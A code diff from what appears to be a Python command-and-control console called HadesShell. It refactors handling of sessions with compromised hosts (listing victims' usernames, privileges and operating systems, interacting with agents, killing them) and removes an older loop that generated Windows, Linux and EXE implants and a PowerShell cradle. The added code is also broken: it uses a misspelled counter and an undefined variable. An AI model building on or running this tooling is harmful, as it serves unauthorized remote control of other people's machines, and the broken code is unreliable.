@@ -477,173 +477,71 @@ class HadesShell(cmd.Cmd):
         else:
             error("Generate Listener First")
 
+    # generate Sessions command
+    def do_sessions(self, arg):
+        sesions_counter = 0
+        args = str(arg.strip()).split(" ")
+
+        # List sessions
+        if args[0] == "-l" or args[0] == "--list":
+            # Define Table
+            myTable = PrettyTable()
+            print(Fore.YELLOW + Style.BRIGHT)
+            # Table Headers
+            myTable.field_names = ["Session",
+                                   "Status",  # 7
+                                   "Username",  # 3
+                                   "Privilege",  # 4
+                                   "Target",  # 1
+                                   "Operating System",  # 5
+                                   "Check-In Time"]  # 2
+            myTable.padding_width = 3
+
+            # Table Rows
+            for target in targets:
+                myTable.add_row([session_counter,
+                                 target[7],  # Status
+                                 target[3],  # Username
+                                 target[4],  # Check Privileges (User/Admin)
+                                 target[1],  # Target
+                                 target[5],  # Operating System
+                                 target[2]])  # Check-In Time
+                session_counter += 1
+
+            # Print Table
+            print(myTable)
+            print(Style.RESET_ALL)
+
+        # Interact with sessions
+        if args[0] == "-i" or args[0] == "--interact":
+            try:
+                num = int(command.split(" ")[2])
+                targ_id = (targets[num])[0]
+                if (targets[num])[7] == 'Active':
+                    target_comm(targ_id, targets, num)
+                else:
+                    error("The Dead Don't Talk - Cannot communicate with agent")
+            except IndexError:
+                error(f"Session {num} does not exist")
+
+        # Kill session
+        if args[0] == "-k" or args[0] == "--kill":
+            try:
+                num = int(command.split(" ")[2])
+                targ_id = (targets[num])[0]
+                if (targets[num])[7] == 'Active':
+                    kill_sig(targ_id, 'exit')
+                    targets[num][7] = 'Dead'
+                    error(f"Session {num} Killed")
+                else:
+                    error(f"Session {num} is already dead")
+            except IndexError:
+                error(f"Session {num} does not exist")
+            except NameError:
+                pass
 
 
 
 # Main Function
 if __name__ == "__main__":
     HadesShell().cmdloop()
-
-if __name__ == "ppppppppp":
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Target List Store
-    targets = []
-    banner()
-
-    # Count Variables
-    kill_flag = 0
-    listener_counter = 0
-
-    host_ip = ''
-    host_port = 0
-
-    while True:
-        try:
-            command = input(Fore.LIGHTMAGENTA_EX + f"Charon@{host_ip}$ " + Style.RESET_ALL).strip()
-
-            match command:
-                case ('help' | 'h'):
-                    help()
-                case ('clear' | 'cls'):
-                    clear()
-                case ('listeners -g' | 'listeners --generate'):
-                    host_ip = input(Fore.BLUE + "[i] Enter Listener IP: " + Style.RESET_ALL)
-                    host_port = input(Fore.BLUE + "[i] Enter Listener Port: " + Style.RESET_ALL)
-                    listener_handler()
-                    listener_counter += 1
-
-                case ('pshell_shell'):
-                    pshell_cradle()
-                case 'winplant.py':
-                    if listener_counter > 0:
-                        winplant()
-                    else:
-                        error("Generate Listener First")
-
-                case 'linplant.py':
-                    if listener_counter > 0:
-                        linplant()
-                    else:
-                        error("Generate Listener First")
-
-                case 'exeplant.py':
-                    if listener_counter > 0:
-                        exeplant()
-                    else:
-                        error("Generate Listener First")
-                case ('exit'):
-                    quit_message = input(
-                        Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
-                    if quit_message == 'y' or quit_message == 'yes':
-                        tar_length = len(targets)
-                        # Delete Payloads
-                        process("Deleting Payloads")
-                        try:
-                            if os.path.exists('Generated Payloads'):
-                                shutil.rmtree('Generated Payloads')
-                        except PermissionError:
-                            error("Permission Denied - Payload is still running")
-                            break
-                        for target in targets:
-                            if target[7] == 'Dead':
-                                pass
-                            else:
-                                comm_out(target[0], 'exit')
-                        kill_flag = 1
-                        if listener_counter > 0:
-                            sock.close()
-                        quit("Quitting...")
-                        break
-                    else:
-                        continue
-
-            # Generate Sessions Commands
-            if command.split(" ")[0] == 'sessions':
-                session_counter = 0
-
-                # List Sessions
-                if command.split(" ")[1] == '-l' or command.split(" ")[1] == '--list':
-
-                    # Define Table
-                    myTable = PrettyTable()
-                    print(Fore.YELLOW + Style.BRIGHT)
-                    # Table Headers
-                    myTable.field_names = ["Session",
-                                           "Status",  # 7
-                                           "Username",  # 3
-                                           "Privilege",  # 4
-                                           "Target",  # 1
-                                           "Operating System",  # 5
-                                           "Check-In Time"]  # 2
-                    myTable.padding_width = 3
-
-                    # Table Rows
-                    for target in targets:
-                        myTable.add_row([session_counter,
-                                         target[7],  # Status
-                                         target[3],  # Username
-                                         target[4],  # Check Privileges (User/Admin)
-                                         target[1],  # Target
-                                         target[5],  # Operating System
-                                         target[2]])  # Check-In Time
-                        session_counter += 1
-
-                    # Print Table
-                    print(myTable)
-                    print(Style.RESET_ALL)
-                # Interact with Session                        
-                if command.split(" ")[1] == '-i' or command.split(" ")[1] == '--interact':
-                    try:
-                        num = int(command.split(" ")[2])
-                        targ_id = (targets[num])[0]
-                        if (targets[num])[7] == 'Active':
-                            target_comm(targ_id, targets, num)
-                        else:
-                            error("The Dead Don't Talk - Cannot communicate with agent")
-                    except IndexError:
-                        error(f"Session {num} does not exist")
-
-                # Kill Session
-                if command.split(" ")[1] == '-k' or command.split(" ")[1] == '--kill':
-                    try:
-                        num = int(command.split(" ")[2])
-                        targ_id = (targets[num])[0]
-                        if (targets[num])[7] == 'Active':
-                            kill_sig(targ_id, 'exit')
-                            targets[num][7] = 'Dead'
-                            error(f"Session {num} Killed")
-                        else:
-                            error(f"Session {num} is already dead")
-                    except IndexError:
-                        error(f"Session {num} does not exist")
-                    except NameError:
-                        continue
-
-        except KeyboardInterrupt:
-            quit_message = input(
-                Fore.LIGHTRED_EX + "\n[!] Are you sure you want to quit? (yes/no): " + Style.RESET_ALL).lower()
-            if quit_message == 'y' or quit_message == 'yes':
-                tar_length = len(targets)
-                # Delete Payloads
-                process("Deleting Payloads")
-                try:
-                    if os.path.exists('Generated Payloads'):
-                        shutil.rmtree('Generated Payloads')
-                except PermissionError:
-                    error("Permission Denied - Payload is still running")
-                    break
-                for target in targets:
-                    if target[7] == 'Dead':
-                        pass
-                    else:
-                        comm_out(target[0], 'exit')
-                kill_flag = 1
-                if listener_counter > 0:
-                    sock.close()
-                quit("Quitting...")
-                break
-            else:
-                continue
-
-        except ConnectionAbortedError:
-            break
